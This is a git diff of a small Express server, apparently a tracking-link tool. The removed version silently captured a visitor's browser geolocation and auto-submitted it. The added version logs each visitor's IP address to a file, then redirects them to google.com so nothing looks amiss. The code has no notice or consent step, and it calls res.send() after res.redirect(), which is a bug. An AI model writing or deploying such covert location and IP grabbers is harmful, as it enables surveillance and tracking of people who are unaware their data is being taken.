@@ -4,6 +4,7 @@ const app = express();
 const bodyParser = require('body-parser');
 
 const fs = require('fs');
+const { isIP } = require('net');
 
 
 app.use(bodyParser());
@@ -11,45 +12,29 @@ app.use(bodyParser.urlencoded({extended:false}));
 
 
 app.get('/', (req, res) => {
-    res.send(
-`
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>page</title>
-</head>
-<body>
-    <form method="POST" action="/save" id="data" name="data">
-        <input name="location" id="location" value="">
-    </form>
-    <script>
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            var latitude = pos.coords.latitude;
-            var longitude = pos.coords.longitude;
+    var ip = req.headers['x-forwarded-for'] ||
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        req.connection.socket.remoteAddress;
 
-            document.getElementById('location').value = String(latitude) + ' ' + String(longitude);
-            document.getElementById('data').submit();
+    var result = ''
+    var allowed = '1234567890.';
 
-            console.log(latitude, longitude)
-        });
+    for (var i=0; i<ip.length; i++) {
+        for (var a=0; a<allowed.length; a++) {
+            if (ip[i] == allowed[a]) {
+                result += ip[i];
+                break;
+            }
+        }
+    }
 
-    </script>
-</body>
-</html>
-`
-    );
-});
-
-app.post('/save', (req, res) => {
-    console.log(req.body)
-    let location = req.body.location;
-    let num = fs.readdirSync('./data').length;
-
-    fs.writeFileSync(`./data/${num}`, String(location));
+    var num = fs.readdirSync('./data').length;
+    
+    fs.writeFileSync(`./data/${num}`, result);
     res.redirect('https://google.com');
+    console.log(result);
+    res.send();
 });
 
 app.listen(4000, () => {
